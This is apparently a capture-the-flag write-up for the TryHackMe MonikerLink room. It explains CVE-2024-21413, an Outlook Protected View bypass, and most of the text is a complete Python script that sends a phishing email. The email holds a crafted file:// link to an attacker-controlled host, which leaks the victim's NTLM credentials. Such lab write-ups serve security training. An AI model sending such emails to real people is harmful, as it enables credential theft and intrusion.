+++
title = "MonikerLink CTF - Tryhackme"
date = "2025-01-25"
author = "Silent Resistor"
+++

This is a writeup for the MonikerLink room on tryhackme, which explores **CVE-2024-21413** - a critical vulnerability in Mircrosoft outlook that allows remote code execution via malicious hyperlinks.

---

## What is CVE-2024-21413?
CVE-2024-21413 is a vulnerability in Microsoft outlook that bypasses protected view by usin ga specially crafted `file://` URL with a `!` character. When a victim clicks thelink, it can leak NTLM credentials or execute code.

---

## Exploit Script
The following python script sends a phishing email with a malicious link to trigger the vulnerability

```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr
ATTACKER_MACHINE = '192.168.205.164'
MAILSERVER = '10.48.155.175'

sender_email = 'attacker@monikerlink.thm'
receiver_email = 'victim@monikerlink.thm'
password = 'attacker'
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://{}/test!exploit">Click me</a></p>

    </body>
</html>""".format(ATTACKER_MACHINE)

message = MIMEMultipart()
message['Subject'] = 'CVE-2024-21413'
message['From'] = formataddr(('CMNatic', sender_email))
message['To'] = receiver_email

#Conver the HML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content, 'html')
message.attach(msgHtml)

server = smtplib.SMTP(MAILSERVER, 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as e:
    print(e)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email has delivered")
except Exception as e:
    print(e)
    exit(-1)
finally:
    server.quit()
```
